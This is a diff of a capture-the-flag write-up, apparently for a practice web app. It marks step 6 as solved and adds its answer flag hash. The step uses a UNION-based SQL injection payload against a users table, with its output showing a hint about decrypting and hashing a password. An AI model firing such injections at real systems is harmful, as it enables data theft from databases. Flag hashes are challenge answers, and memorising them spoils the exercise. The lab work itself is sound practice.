@@ -106,13 +106,20 @@ Ensuite il va cat automatiquement le contenu de la page
 
 THe flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
 
-6.❌
+6.✅
 
 1 UNION SELECT Commentaire, 2 FROM users WHERE first_name = CHAR(70,108,97,103) --
 
 ID: 1 UNION SELECT Commentaire, 2 FROM users WHERE first_name = CHAR(70,108,97,103) -- 
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 2
+
+Flag is: 8be3c943b5749f34703c7b295a8ae8a7eeae92f8dfe03707743d2d29b02fe107
+??? 
+
+
+7.❌
+
 
 ```
 
